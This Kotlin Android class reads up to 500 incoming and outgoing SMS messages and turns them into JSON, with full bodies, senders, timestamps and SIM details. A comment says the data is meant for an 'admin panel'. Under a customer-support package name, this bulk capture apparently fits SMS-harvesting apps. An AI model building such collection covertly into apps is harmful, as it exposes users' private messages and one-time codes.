package com.customersupport.data

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.Telephony
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class SmsReader(private val context: Context) {
    
    companion object {
        private const val TAG = "SmsReader"
    }

    fun readAllSms(limit: Int = 500): JSONArray {
        val smsArray = JSONArray()

        try {
            val contentResolver: ContentResolver = context.contentResolver
            val halfLimit = limit / 2
            readSmsFromUri(contentResolver, Telephony.Sms.Inbox.CONTENT_URI, "incoming", smsArray, halfLimit)
            readSmsFromUri(contentResolver, Telephony.Sms.Sent.CONTENT_URI, "outgoing", smsArray, halfLimit)
            Log.d(TAG, "Read ${smsArray.length()} SMS messages")
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied to read SMS", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error reading SMS", e)
        }

        return smsArray
    }

    private fun readSmsFromUri(
        contentResolver: ContentResolver,
        uri: android.net.Uri,
        type: String,
        smsArray: JSONArray,
        limit: Int
    ) {
        val baseProjection = arrayOf(
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.SUBSCRIPTION_ID
        )
        val sortOrder = "${Telephony.Sms.DATE} DESC"

        // "sim_slot" is the underlying column for Telephony.Sms.SIM_SLOT (constant is
        // API 35+). Query it by raw name, and retry without it on devices where the
        // column doesn't exist.
        val cursor: Cursor? = try {
            contentResolver.query(uri, baseProjection + "sim_slot", null, null, sortOrder)
        } catch (e: Exception) {
            contentResolver.query(uri, baseProjection, null, null, sortOrder)
        }

        cursor?.use {
            val idIndex = it.getColumnIndex(Telephony.Sms._ID)
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            val subIdIndex = it.getColumnIndex(Telephony.Sms.SUBSCRIPTION_ID)
            // "sim_slot" is the underlying column for Telephony.Sms.SIM_SLOT (API 35+).
            // Query it by raw name so it works on all API levels; -1 if unsupported.
            val slotIndex = it.getColumnIndex("sim_slot")
            var count = 0

            while (it.moveToNext() && count < limit) {
                count++
                val id = it.getString(idIndex) ?: ""
                val address = it.getString(addressIndex) ?: "Unknown"
                val body = it.getString(bodyIndex) ?: ""
                val date = it.getLong(dateIndex)
                val subId = if (subIdIndex >= 0) {
                    try { it.getInt(subIdIndex) } catch (e: Exception) { -1 }
                } else -1
                val slot = if (slotIndex >= 0) {
                    try { it.getInt(slotIndex) } catch (e: Exception) { -1 }
                } else -1

                val smsJson = JSONObject().apply {
                    put("id", "${type}_$id")
                    put("sender", if (type == "incoming") address else "Me")
                    put("receiver", if (type == "outgoing") address else "Me")
                    put("message", body)
                    put("timestamp", formatDate(date))
                    put("type", type)
                    // Per-SIM provenance for multi-SIM detection in the admin panel.
                    // -1 / missing = unknown (older Android versions omit these columns).
                    if (subId > 0) put("subscriptionId", subId)
                    if (slot >= 0) {
                        put("slotIndex", slot)
                        put("simSlot", slot)
                    }
                }
                smsArray.put(smsJson)
            }
        }
    }

    private fun formatDate(timestamp: Long): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
        sdf.timeZone = TimeZone.getTimeZone("UTC")
        return sdf.format(Date(timestamp))
    }
}
